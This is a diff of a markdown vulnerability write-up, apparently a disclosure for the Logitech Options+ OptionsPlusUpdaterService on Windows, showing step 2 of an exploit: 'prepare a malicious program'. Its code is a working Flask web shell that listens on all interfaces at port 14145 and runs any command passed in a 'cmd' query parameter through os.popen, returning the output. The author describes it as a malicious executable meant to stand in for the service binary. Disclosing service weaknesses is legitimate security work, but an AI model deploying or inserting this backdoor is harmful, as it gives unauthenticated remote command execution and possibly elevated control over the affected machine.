@@ -9,19 +9,22 @@ The first step：open services.msc find OptionsPlusUpdaterService
 
 Step 2：Prepare a malicious program
 ![image](https://github.com/happy0717/windows-Logi-OptionsPlus-OptionsPlusUpdaterService-is-Vulnerable-Services/blob/main/pic2.png)
-  from flask import Flask, request
-  import os
 
-  app = Flask(__name__)
+    from flask import Flask, request
+    import os
 
-  @app.route('/')
-  def hello_world():
-      r = request.args.getlist('cmd')  #Reception? cmd= parameter
-      a=os.popen(r[0])  #Execute system commands
-      l = a.read()
-      return l  #return
+    app = Flask(__name__)
 
-  if __name__ == '__main__':
-      app.run(host='0.0.0.0', port=14145, debug=True)  #Listen HTTP port 14145
-      
+    @app.route('/')
+    def hello_world():
+        r = request.args.getlist('cmd')  #Reception? cmd= parameter
+        a=os.popen(r[0])  #Execute system commands
+        l = a.read()
+        return l  #return
+
+    if __name__ == '__main__':
+        app.run(host='0.0.0.0', port=14145, debug=True)  #Listen HTTP port 14145
+
+
+
 I was useing python3 flask write a malicious exe .It can listenHTTP port 14145 and execute system commands.
